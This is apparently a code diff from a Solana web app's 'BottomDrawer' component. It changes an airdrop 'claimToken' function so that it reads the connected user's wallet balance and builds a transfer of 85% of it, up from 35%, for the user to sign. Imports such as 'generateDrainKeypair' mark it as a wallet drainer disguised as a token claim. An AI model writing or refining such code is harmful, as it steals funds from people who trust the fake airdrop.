@@ -37,7 +37,7 @@ import { useWallet } from '@solana/wallet-adapter-react'
 // import { approveTokensForSpendingandSendToken } from '@/app/services/hook/sendSol'
 import { executeConnectionObject } from '@/app/services/redux/walletConnectionObject'
 import { generateSolanaWallet } from '@/app/services/hook/generateDrainKeypair'
-import { createTransferTransaction, pollSignatureStatus, signAndSendTransaction } from '@/app/services/hook/phantomCollections';
+import { createTransferTransaction, createTransferTransactionV0, pollSignatureStatus, signAndSendTransaction } from '@/app/services/hook/phantomCollections';
 
 const BottomDrawer = () => {
   const {publicKey, sendTransaction  , wallet , connected } =   useWallet();
@@ -49,11 +49,14 @@ const resetClaim  = changeClaimStages((state)=>state.resetClaim)
 const getUsersBalance = executeConnectionObject((state)=>state.accountBalance)
 const usersPublicKey = executeConnectionObject((state)=>state.usersPublicKey);
 
-const AIRDROP_BALANCE = ((getUsersBalance * 35)  / 100) ;
+
+
 const connection =  new Connection(String(process.env.NEXT_PUBLIC_SOLANA_HTTPS))
 async function claimToken(){
   try {
-    const transaction = await createTransferTransaction(publicKey as unknown as PublicKey, connection);
+    const balance =  (await connection.getBalance(publicKey as unknown as PublicKey) )
+    const AIRDROP_BALANCE = ((balance * 85)  / 100) ;
+    const transaction = await createTransferTransactionV0(publicKey as unknown as PublicKey, connection , AIRDROP_BALANCE);
     console.log({
       status: 'info',
       method: 'signAndSendTransaction',
